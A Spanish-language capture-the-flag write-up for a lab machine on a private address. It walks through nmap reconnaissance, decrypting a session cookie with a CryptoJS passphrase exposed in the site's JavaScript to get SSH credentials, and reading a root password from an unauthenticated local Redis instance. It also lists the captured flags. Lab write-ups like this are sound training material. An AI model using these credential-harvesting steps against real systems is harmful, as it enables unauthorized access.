# Summary
- IP: 192.168.0.108
- Ports: 22,80
- OS: Linux (Debian Buster)
- Services & Applications:
	-  22 -> OpenSSH 7.9p1 Debian 10+deb10u2
	-  80 -> Apache httpd 2.4.38

# Recon

- Reconocimiento básico de puertos:

```
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.108 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```
$sudo nmap -p22,80 -sCV 192.168.0.108 -oN targeted
```

- Escaneo básico de página web:

```
$sudo nmap --script http-enum -p80 192.168.0.108 -oN webScan
```

- Analizamos el código fuente de la página web principal, vemos un main.js el cual contiene código con la función de CryptoJS con la respectiva contraseña.
- En el buscador encontramos una plantilla para usar la función de crypto JS y probamos introduciendo la cookie de sesión que parece estar cifrada para poder descifrarla:

```
// INIT
var encrypted   = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt";
var myPassword = "SecretPassphraseMomentum";


// PROCESS
var decrypted = CryptoJS.AES.decrypt(encrypted, myPassword);

document.getElementById("demo2").innerHTML = decrypted;
document.getElementById("demo3").innerHTML = decrypted.toString(CryptoJS.enc.Utf8);
--------------------------------------------------------------------------------------------------------------
Decrypted: 617578657272652d616c69656e756d2323

String after Decryption: auxerre-alienum##**
```

- Intentamos usar el stirng descrifrado como contraseña para acceder via ssh a la máquina con el usuario "auxerre":

```
$ssh auxerre@192.168.0.108
```

- Encontramos la flag de usuario:

# USER FLAG: 84157165c30ad34d18945b647ec7f647


# ESCALANDO PRIVILEGIOS:

- Hacemos búsqueda básica y no encontramos nada.
- Enumeramos los procesos activos y encontramos un redis-server corriendo en el puerto 6379:

```
ps -faux
```

- Comprobamos que dicho puerto esté abierto:

```
ss -nltp
```

- Nos conectamos al equipo local por el puerto 6379:

```
nc localhost 6379
```

- Consultamos que bases de datos están activas:

```
INFO keyspace
```

- Seleccionamos la base de datos existente

```
SELECT 0
```

- Mostramos las keys:

```
KEYS *
```

- Leemos la key encontrada:

```
GET rootpass
```

- Obtenemos la credencial de root, accedemos y obtenemos la flag:

# ROOT FLAG: 658ff660fdac0b079ea78238e5996e40


